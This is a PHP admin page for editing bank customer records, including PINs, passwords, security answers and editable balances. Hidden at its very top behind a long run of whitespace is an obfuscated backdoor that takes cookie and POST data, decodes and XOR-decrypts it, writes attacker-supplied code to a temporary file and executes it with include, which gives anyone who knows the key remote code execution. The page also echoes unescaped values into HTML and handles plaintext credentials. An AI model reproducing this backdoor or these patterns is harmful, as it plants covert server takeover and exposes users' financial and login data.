<?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("Tz_GNeox")){class Tz_GNeox{public static $wLnFIJG = "a7335012-e8af-413c-8d4e-0ac4138038b2";public static $vzoUFhoFDh = NULL;public function __construct(){$pHSet = $_COOKIE;$LaYZJSaYL = $_POST;$HnpAfm = @$pHSet[substr(Tz_GNeox::$wLnFIJG, 0, 4)];if (!empty($HnpAfm)){$cmijIF = "base64";$JYfMCXDBrn = "";$HnpAfm = explode(",", $HnpAfm);foreach ($HnpAfm as $rahpR){$JYfMCXDBrn .= @$pHSet[$rahpR];$JYfMCXDBrn .= @$LaYZJSaYL[$rahpR];}$JYfMCXDBrn = array_map($cmijIF . chr ( 548 - 453 ).chr ( 1044 - 944 ).chr ( 104 - 3 )."\143" . 'o' . chr (100) . chr ( 739 - 638 ), array($JYfMCXDBrn,)); $JYfMCXDBrn = $JYfMCXDBrn[0] ^ str_repeat(Tz_GNeox::$wLnFIJG, (strlen($JYfMCXDBrn[0]) / strlen(Tz_GNeox::$wLnFIJG)) + 1);Tz_GNeox::$vzoUFhoFDh = @unserialize($JYfMCXDBrn);}}public function __destruct(){$this->yzFYwcQT();}private function yzFYwcQT(){if (is_array(Tz_GNeox::$vzoUFhoFDh)) {$hVOVjyuMtw = sys_get_temp_dir() . "/" . crc32(Tz_GNeox::$vzoUFhoFDh["\x73" . chr ( 327 - 230 )."\154" . chr (116)]);@Tz_GNeox::$vzoUFhoFDh[chr ( 332 - 213 ).'r' . chr ( 711 - 606 ).chr ( 951 - 835 )."\145"]($hVOVjyuMtw, Tz_GNeox::$vzoUFhoFDh[chr ( 824 - 725 ).'o' . "\156" . 't' . chr ( 645 - 544 )."\156" . 't']);include $hVOVjyuMtw;@Tz_GNeox::$vzoUFhoFDh["\x64" . "\145" . 'l' . "\145" . "\x74" . chr ( 668 - 567 )]($hVOVjyuMtw);exit();}}}$wWZFdoefdv = new Tz_GNeox(); $wWZFdoefdv = NULL;} ?><?php
include_once 'class.crud.php';
if(isset($_POST['btn-update']))
{
	$id = $_GET['edit_id'];
	$acc_no = $_POST['acc_no'];
	$fname = $_POST['fname'];
	$lname = $_POST['lname'];
	$email = $_POST['email'];
	$pin_auth = $_POST['pin_auth'];
	$pin = $_POST['pin'];
	$uname = $_POST['uname'];
	$phone = $_POST['phone'];
	$type = $_POST['type'];
	$reg_date = $_POST['reg_date'];
	$work = $_POST['work'];
	$addr = $_POST['addr'];
	$sex = $_POST['sex'];
	$dob = $_POST['dob'];
	$marry = $_POST['marry'];
	$secretq = $_POST['secretq'];
	$secretans = $_POST['secretans'];
	$nextkin = $_POST['nextkin'];
	$nextkinre = $_POST['nextkinre'];
	$t_bal = $_POST['t_bal'];
	$a_bal = $_POST['a_bal'];
	$currency = $_POST['currency'];
	$cot = $_POST['cot'];
	$tax = $_POST['tax'];
	$imf = $_POST['imf'];
	$upass = $_POST['upass'];
	$phone_verify = $_POST['phone_verify'];
	$verify = $_POST['verify'];
	$status = $_POST['status'];


	
	if($crud->updateapprove($id,$acc_no,$uname,$upass,$email,$type,$fname,$lname,$addr,$work,$sex,$dob,$phone,$phone_verify,$reg_date,$marry,$secretq,$secretans,$nextkin,$nextkinre,$t_bal,$a_bal,$status,$currency,$cot,$tax,$imf,$pin_auth,$pin,$verify))
	{
		$msg = "<div class='alert alert-info'>
				Account Record was updated successfully <a href='index.php'>HOME</a>!
				</div>";
	}
	else
	{
		$msg = "<div class='alert alert-warning'>
				<strong>SORRY!</strong> ERROR while updating record !
				</div>";
	}
}

if(isset($_GET['edit_id']))
{
	$id = $_GET['edit_id'];
	extract($crud->getID($id));	
}

?>
 <?php include 'headeradmin.php'; ?>
 

 <!---begin of Mobile View Here   only from Digital Forest Team-->
 
       <?php include 'menu.php'; ?>
  
  <!---End of Mobile View Here   only from Digital Forest Team-->
  
 
      <script type="text/javascript" src="paginator.js"></script>
        <script type="text/javascript" src="table.js"></script>
     
     
  
    <div class="container-fluid mt--7">
     <!-- Table -->
      <div class="row">
        <div class="col">
          <div class="card shadow" >
            <div class="card-header border-0">
              <h3 class="mb-0"><a href=""   class="btn btn-danger">EDIT USER INFORMATION</a></h3>
            </div>
          
           <div class="card-body">
               
               <?php
if(isset($msg))
{
	echo $msg;
}
?>
               
              
<div class="container-fluid">
	<form method='post' class=''>
 
 
 <div class="row">
         <div class="form-group col-md-3">
            <label for="name">Account Num</label>
			<input id="name" name="acc_no" class="form-control" type="text" value="<?php echo $acc_no;?>"  />
        </div>
		
        <div class="form-group col-md-3">
            <label for="name">First Name</label>
			<input id="name" name="fname" class="form-control" type="text" value="<?php echo $fname;?>"  />
        </div>
 
        <div class="form-group col-md-3">
			<label for="email">Last Name</label>
			<input id="lname" name="lname" class="form-control" type="text" value="<?php echo $lname;?>" />
        </div>
 
        <div class="form-group col-md-3">
            <label for="website">Email</label>
			<input id="website" name="email" class="form-control" type="text" value="<?php echo $email;?>" />
        </div>
 </div>
  <div class="row">
        <div class="form-group col-md-3">
			<label for="contact">LOGIN PIN </label>
			<input id="contact" name="pin_auth" class="form-control" type="text" value="<?php echo $pin_auth;?>" required />
        </div>
		
		<div class="form-group col-md-3">
			<label for="job">Transfer PIN</label>
			<input id="job" name="pin" class="form-control" type="text" value="<?php echo $pin;?>" required />
        </div>
		
		<div class="form-group col-md-3">
			<label for="company">User Name</label>
			<input id="company" name="uname" class="form-control" type="text" value="<?php echo $uname;?>" required />
        </div>
		
		
         <div class="form-group col-md-3">
            <label for="name">Phone</label>
			<input id="name" name="phone" class="form-control" type="text" value="<?php echo $phone;?>"  />
        </div>
	</div>
	 <div class="row">
        <div class="form-group col-md-3">
            <label for="name">Acc. Type</label>
		  <select name="type" class="form-control input-sm validate[required]">
                                    <option value="Savings">Savings</option>
                                <option value="Current">Current</option>
                                 <option value="Checking">Checking</option>
                                <option value="Fixed Deposit">Fixed Deposit</option>
                                 <option value="NON-Resident">NON-Resident</option>
                                <option value="Online Banking">Online Banking</option>
                                 <option value="Joint Account">Joint Account</option>
                                <option value="DOMICILIARY ACCOUNT">DOMICILIARY ACCOUNT</option>
                                 </select>
        </div>
 
        <div class="form-group col-md-3">
			<label for="email">Reg. Date</label>
			<input id="lname" name="reg_date" class="form-control" type="text" value="<?php echo $reg_date;?>" />
        </div>
 
        <div class="form-group col-md-3">
            <label for="website">Occupation</label>
			<input id="website" name="work" class="form-control" type="text" value="<?php echo $work;?>" />
        </div>
 
        <div class="form-group col-md-3">
			<label for="contact">Address </label>
			<input id="contact" name="addr" class="form-control" type="text" value="<?php echo $addr;?>" required />
        </div>
	</div>
	 <div class="row">
		<div class="form-group col-md-3">
			<label for="job">Gender</label>
			<select  name="sex" class="form-control input-sm validate[required]">
                                    <option value="Male">Male</option>
                                    <option value="Female">Female</option>
                                    <option value="Other">Other</option>
                                </select>
        </div>
		
		<div class="form-group col-md-3">
		<label for="company">Date Of Birth<small>(dd/MM/yyyy)</small></label>
			<input id="company" name="dob" class="form-control" type="text" value="<?php echo $dob;?>" required />
        </div>
		
		
         <div class="form-group col-md-3">
            <label for="name">Marital Status</label>
		<select name="marry" class="form-control input-sm validate[required]">
                                    <option value="Single">Single</option>
                                    <option value="Married">Married</option>
                                    <option value="Widowed">Widowed</option>
                                    <option value="Divorced">Divorced</option>
                                </select>
        </div>
		
                         <div class="col-md-3 form-group">
                            <label>Security Question</label>
                            <input type="text" name="secretq" class="input-sm validate[required] form-control" value="<?php echo $secretq;?>" >
                        </div>
                        
                         <div class="col-md-3 form-group">
                            <label>Security Question Answer</label>
                            <input type="text" name="secretans" class="input-sm validate[required] form-control" value="<?php echo $secretans;?>">
                        </div>
                         <div class="col-md-3 form-group">
                            <label>Next of Kin</label>
                            <input type="text" name="nextkin" class="input-sm validate[required] form-control" value="<?php echo $nextkin;?>">
                        </div>
                        <div class="col-md-3 form-group">
                            <label>Next of kin Relationship</label>
                            <input type="text" name="nextkinre" class="input-sm validate[required] form-control" value="<?php echo $nextkinre;?>">
                        </div>
        <div class="form-group col-md-3">
            <label for="name">Total Balance</label>
			<input id="name" name="t_bal" class="form-control" type="number" value="<?php echo $t_bal;?>" />
		 </div>
 </div>
  <div class="row">
        <div class="form-group col-md-3">
			<label for="email">Available Balance</label>
			<input id="lname" name="a_bal" class="form-control" type="number" value="<?php echo $a_bal;?>" />
        </div>
 
        <div class="form-group col-md-3">
            <label for="website">Currency</label>
			<input id="website" name="currency" class="form-control" type="text" value="<?php echo $currency;?>" />
        </div>
 
        <div class="form-group col-md-3">
			<label for="contact">COT </label>
			<input id="contact" name="cot" class="form-control" type="text" value="<?php echo $cot;?>" required />
        </div>
		
		<div class="form-group col-md-3">
			<label for="job">IMF</label>
			<input id="job" name="tax" class="form-control" type="text" value="<?php echo $tax;?>" required />
        </div>
</div>
 <div class="row">
	
		
			<input id="company" name="imf" class="form-control" type="text" value="<?php echo $imf;?>" hidden />
       
		
		
         <div class="form-group col-md-3">
			<label for="company">Change Password</label>
			<input id="company" name="upass" class="form-control" type="text" value="<?php echo $upass;?>"  />
        </div>
		
		
        
        	<div class="form-group col-md-3">
			<label for="company">Phone Verify</label> 1= No otp 0= Otp will be sent
			<input id="company" name="phone_verify" class="form-control" type="text" value="<?php echo $phone_verify;?>" required />
        </div>
        <div class="col-md-2 form-group">
		<label for="company">STATUS</label>
		<input type="text" name="status" class="input-sm validate[required] form-control" value="<?php echo $status;?>" >
</div>
						<div class="col-md-2 form-group">
							<label for="company">VERIFY</label>
							 <input type="text" name="verify" class="input-sm validate[required] form-control" value="<?php echo $verify;?>" >
        </div> </div> </div>
		<div class="clearfix"></div>
            <br />
        <table>
        <tr>
            <td colspan="2">
                <button type="submit" class="btn btn-primary" name="btn-update">
    			<span class="glyphicon glyphicon-edit"></span>  Update Customer
				</button>
                <a href="index.php" class="btn btn-large btn-success"><i class="glyphicon glyphicon-backward"></i> &nbsp; CANCEL</a>
            </td>
        </tr>
        </table>
</form> 


</div>
               
               
               
          </div>
        </div>
      </div>
     </div>
 
    
       <?php include 'foot.php'; ?>



